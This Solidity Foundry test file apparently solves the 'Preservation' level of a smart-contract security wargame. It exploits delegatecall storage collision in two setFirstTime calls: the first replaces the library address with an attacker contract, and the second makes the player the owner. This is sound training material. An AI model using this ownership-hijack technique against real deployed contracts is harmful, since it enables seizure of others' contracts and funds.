// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.28;

import "forge-std/console.sol";
import {Tests} from "@/02_security/core/Tests.sol";
import {Preservation, PreservationFactory} from "@/02_security/16_preservation/PreservationFactory.sol";
import {PreservationAttack} from "@/02_security/16_preservation/PreservationAttack.sol";

contract PreservationTest is Tests {
    Preservation private level;
    PreservationAttack private attacker;

    /* =============================== SETUP & ATTACK =============================== */

    constructor() {
        levelFactory = new PreservationFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = Preservation(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        attacker = new PreservationAttack();

        console.log("Attacker contract's address:", address(attacker));
        console.log("Player's address:", PLAYER);

        console.log("==========================");

        console.log("Time zone 1 Library:", level.timeZone1Library());
        console.log("Time zone 2 Library:", level.timeZone2Library());
        console.log("Owner:", level.owner());

        // Step 1: Overwrite timeZone1Library with attacker contract address
        // Due to delegatecall, this sets Preservation.timeZone1Library = address(attacker)
        // Since Solidity 0.8.0 address types can only be type casted to uint160
        //(but this works because then it's implicitly converted to uint256)
        level.setFirstTime(uint160(address(attacker)));

        console.log("==========================");

        // Step 2: Trigger delegatecall into attacker contract
        // Now setFirstTime will call attacker's setTime, overwriting the owner slot
        level.setFirstTime(uint160(address(PLAYER)));

        console.log("Post-attack: Time zone 1 Library:", level.timeZone1Library());
        console.log("Post-attack: Time zone 2 Library:", level.timeZone2Library());
        console.log("Post-attack: Owner:", level.owner());

        if (level.owner() == PLAYER) {
            console.log("Attack successful!");
        }

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
